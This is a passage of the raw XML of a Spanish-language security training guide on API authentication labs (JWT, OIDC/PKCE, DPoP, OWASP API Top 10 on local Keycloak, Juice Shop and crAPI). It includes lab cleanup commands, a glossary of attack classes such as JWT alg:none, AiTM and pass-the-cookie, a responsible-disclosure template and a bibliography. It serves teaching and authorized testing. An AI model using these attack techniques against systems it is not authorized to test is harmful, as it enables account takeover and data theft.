          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Contacto del equipo dueño del sistema.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Incluí alcance probado, pasos mínimos y evidencia enmascarada. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> accedas a datos de terceros para "probar impacto".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Limpieza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docker stop keycloak juice 2&gt;/dev/null; docker rm keycloak juice 2&gt;/dev/null</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## crAPI</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cd crAPI/deploy/docker &amp;&amp; docker compose down -v</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## procesos locales</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>##   Ctrl+C en las terminales de lab_jwt.py y lab_rs.py</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Resumen: paso → qué demuestra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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Pasos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Tema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Qué se comprueba</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Riesgo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i w:val="0"/>
              </w:rPr>
              <w:t>0–4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Basic, API key, OAuth1, bearer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Credenciales por request, clave estática, firma, replay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Nulo (endpoints de práctica)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Cookies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HttpOnly/Secure/SameSite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Nulo (local)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i w:val="0"/>
              </w:rPr>
              <w:t>6–11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JWT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>alg:none</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">, secreto débil, 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exp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>aud</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>, confusión HS/RS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Local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i w:val="0"/>
              </w:rPr>
              <w:t>12–18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OIDC/PKCE/refresh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PKCE obligatorio, claims, rotación, revocación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Local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i w:val="0"/>
              </w:rPr>
              <w:t>19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DPoP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Prueba de posesión por request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Local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i w:val="0"/>
              </w:rPr>
              <w:t>20–24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OWASP Top 10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BOLA, BOPLA, consumo, inventario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Local (crAPI)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i w:val="0"/>
              </w:rPr>
              <w:t>25–30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ID Uruguay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Evidencia + verificación defensiva de tu integración</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Nulo / tu entorno</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Regla final:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>si dudás si tenés permiso para un paso, no lo hagas. En seguridad, la autorización también es un control.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>8. Glosario de atajos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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Término</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Significado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BOLA / IDOR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Presentar token válido para acceder a objetos de otro (Api1 OWASP).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BOPLA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Mass assignment / controlar propiedades que no deberías (Api3).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BFLA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Llamar funciones para las que no tenés permiso (Api5).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Replay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Reutilizar un artefacto capturado (token, prueba) sin cambios.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Sender-constrained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Token que exige prueba de posesión (mTLS, DPoP).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PKCE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Candado del authorization code para clientes públicos (RFC 7636).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>alg: none</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> / confusión de alg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Clases de ataque sobre JWT al confiar en el header del token.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AiTM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Adversary-in-the-Middle: phishing que roba la sesión ya autenticada.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Infostealer / pass-the-cookie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Malware que roba cookies/tokens del navegador.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MFA fatigue (T1621)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Bombardeo de pushes hasta obtener aprobación.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NHI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Identidad no humana (servicio, CI, device).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JWKS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Conjunto de claves públicas para validar JWTs.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Diff channel</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i/>
              </w:rPr>
              <w:t>Front channel</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> (navegador) vs </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i/>
              </w:rPr>
              <w:t>back channel</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> (servidor a servidor).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Ampliación del glosario (enfoques, dominios y normativa)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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Término</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Significado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API Gateway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Componente de entrada que enruta, autentica, aplica cuotas y observa el tráfico.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Rate limiting / cuota / throttling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Límites de caudal por identidad, IP o recurso; base del control de abuso (Api4).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IAM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Identity and Access Management: administración de identidades y sus permisos.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RBAC / ABAC / ReBAC / PBAC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Modelos de autorización por roles / atributos / relaciones / políticas.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Policy as code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Política de autorización versionada y ejecutada por un motor (p. ej. OPA/Rego, Cedar).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NHI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Non-Human Identity: identidad de servicio, workload, CI o dispositivo.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SPIFFE/SPIRE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Estándar y proyecto (CNCF) de identidad de workload con rotación automática.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Zero Trust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Modelo de "verificar siempre, mínimo privilegio, asumir la brecha" (NIST SP 800-207).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SSRF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Server-Side Request Forgery: inducir al servidor a pedir una URL interna (Api7).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XXE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XML External Entity: entidades externas en parsers XML.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Deserialización insegura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Reconstruir objetos a partir de datos no confiables y ejecutar efectos.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Mass assignment (BOPLA)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El cliente controla propiedades que no debería (Api3).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Shadow / zombie API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API olvidada o sin mantenimiento, expuesta sin control (Api9).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SBOM / SCA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Inventario de componentes de software y análisis de dependencias.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Threat modeling / STRIDE / LINDDUN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Metodologías para anticipar amenazas (seguridad / privacidad).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OWASP SAMM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Modelo de madurez de seguridad de software.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WAF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Web Application Firewall: filtrado de ataques conocidos en el borde.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Service mesh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Malla de servicios con mTLS e identidad de workload (tráfico este-oeste).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JOSE (JWS/JWE/JWK/JWA)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Familia de firma, cifrado, claves y algoritmos para tokens (RFC 7515–7518).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PKI / KMS / HSM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Infraestructura de clave pública / gestión de claves / módulo de hardware.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CORS / HSTS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Política de orígenes cruzados / forzado de HTTPS en el navegador.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Capability / confused deputy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Facultad de acceso por posesión; problema del "delegado confundido" (Hardy, 1988).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BOLA / BFLA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Autorización rota a nivel de objeto (Api1) / de función (Api5).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PCI DSS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Estándar de la industria de tarjetas de pago.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Ley 18.331 (Uruguay)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Protección de Datos Personales; regula la URCDP.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Decreto 66/025 (Uruguay)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Obligaciones de ciberseguridad, incluida la gestión de incidentes y el reporte a CERTuy.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CERTuy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Centro Nacional de Respuesta a Incidentes de Seguridad Informática (AGESIC).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i w:val="0"/>
              </w:rPr>
              <w:t>AGESIC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Agencia de Gobierno Electrónico y Sociedad de la Información y del Conocimiento (Uruguay).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9. Plantilla de reporte responsable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="0" w:before="0"/>
        <w:ind w:left="216"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Asunto: [Divulgación Responsable] Posible &lt;vulnerabilidad&gt; en &lt;sistema&gt;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>1. Resumen (2-3 líneas)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>2. Impacto estimado (qué datos/acciones compromete)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>3. Alcance probado (cuenta propia / cliente de prueba; qué NO se tocó)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>4. Pasos de reproducción (mínimos, sin datos de terceros)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>5. Evidencia (capturas enmascaradas, timestamps)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>6. Recomendación de mitigación</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>7. Declaración: no se accedió a datos de terceros ni se alteró información</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>8. Contacto y disponibilidad para coordinar</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">En Uruguay, canal oficial: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CERTuy (AGESIC)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>10. Bibliografía</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Normas IETF:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId40">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 2617</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId41">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 7616</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId42">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 6265</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId43">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 5849</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId44">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 6749</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId45">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 6750</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId46">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 6819</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId39">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 7009</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId47">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 7519</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId48">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 7636</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId49">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 7662</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId50">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 8176</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId51">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 8252</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId52">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 8705</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId53">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 8725</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId54">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 9068</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId55">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 9449</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId56">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 9700</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Identidad y gobierno:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId57">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">OpenID Connect Core 1.0</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId31">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">NIST SP 800-63-4 (jul 2025)</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId58">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Marco de Ciberseguridad de Uruguay (AGESIC)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OWASP y labs:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId23">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">API Security Top 10 2023</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId20">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">JWT Cheat Sheet</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId28">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">WSTG</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId24">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">crAPI</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId25">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Juice Shop</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId26">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">PortSwigger Academy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Casos reales:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId59">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Meta "View As" 2018</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId60">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Cloudflare/Okta 2022</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId61">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Codecov 2021</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId18">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">GitGuardian Secrets Sprawl 2026</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId62">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Uber 2022 (UpGuard)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Uruguay / ID Uruguay:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId38">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Documentación técnica ID Uruguay (gub.uy)</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId63">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">Desarrollo seguro (AGESIC, PDF)</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
